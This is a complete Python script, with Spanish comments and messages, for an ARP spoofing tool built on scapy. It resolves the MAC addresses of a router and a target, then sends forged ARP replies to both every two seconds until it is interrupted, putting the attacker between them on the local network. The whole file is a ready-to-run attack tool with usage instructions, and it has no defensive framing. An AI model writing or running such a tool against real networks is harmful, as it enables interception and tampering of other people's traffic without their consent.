#!/usr/bin/env python3

import scapy.all as scapy
import sys
import time

# Colores ANSI
RED = "\33[91m"
BLUE = "\33[94m"
GREEN = "\033[32m"
YELLOW = "\033[93m"
PURPLE = '\033[0;35m'
CYAN = "\033[36m"
END = "\033[0m"

# Banner en ASCII con azul y amarillo
banner = f"""
{BLUE}
                                           ____         
  ____ __________  _________  ____  ____  / __/__  _____
 / __ `/ ___/ __ \/ ___/ __ \/ __ \/ __ \/ /_/ _ \/ ___/
/ /_/ / /  / /_/ (__  ) /_/ / /_/ / /_/ / __/  __/ /    
\__,_/_/  / .___/____/ .___/\____/\____/_/  \___/_/     
         /_/     __ /_/                               
{YELLOW}
    ____  __  __/ /_/ /_  ____  ____                    
   / __ \/ / / / __/ __ \/ __ \/ __ \                   
  / /_/ / /_/ / /_/ / / / /_/ / / / /                   
 / .___/\__, /\__/_/ /_/\____/_/ /_/                    
/_/    /____/                          
{END}
"""

# Ayuda de uso
usage = f"""
{CYAN}Uso:{END}
  sudo python3 arp_spoofer.py <router_ip> <target_ip>

{CYAN}Ejemplo:{END}
  sudo python3 arp_spoofer.py 192.168.1.1 192.168.1.100

{RED}Advertencia:{END} Este script debe ejecutarse con privilegios de superusuario (sudo).
"""

# Obtener dirección MAC a partir de una IP
def get_mac_address(ip_address):
    broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_layer = scapy.ARP(pdst=ip_address)
    get_mac_packet = broadcast_layer / arp_layer

    answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]

    if len(answer) == 0:
        print(f"{RED}[!] No hay respuesta de {ip_address}. ¿Está en línea?{END}")
        sys.exit(1)

    return answer[0][1].hwsrc

# Enviar paquetes ARP falsificados
def spoof(router_ip, target_ip, router_mac, target_mac):
    packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
    packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)
    scapy.send(packet1, verbose=False)
    scapy.send(packet2, verbose=False)

# Función principal
def main():
    print(banner)
    if len(sys.argv) != 3:
        print(f"{RED}[!] Error: argumentos insuficientes.{END}")
        print(usage)
        sys.exit(1)

    router_ip = sys.argv[1]
    target_ip = sys.argv[2]

    print(f"{GREEN}[*] Resolviendo direcciones MAC...{END}")
    target_mac = get_mac_address(target_ip)
    router_mac = get_mac_address(router_ip)

    print(f"{GREEN}[✓] MAC del objetivo: {target_mac}{END}")
    print(f"{GREEN}[✓] MAC del router: {router_mac}{END}")

    try:
        print(f"{YELLOW}[*] Enviando paquetes ARP cada 2 segundos. Ctrl+C para detener.{END}")
        while True:
            spoof(router_ip, target_ip, router_mac, target_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n{CYAN}[!] Ataque detenido por el usuario. Cerrando...{END}")
        sys.exit(0)

# Ejecutar solo si es invocado directamente
if __name__ == "__main__":
    main()
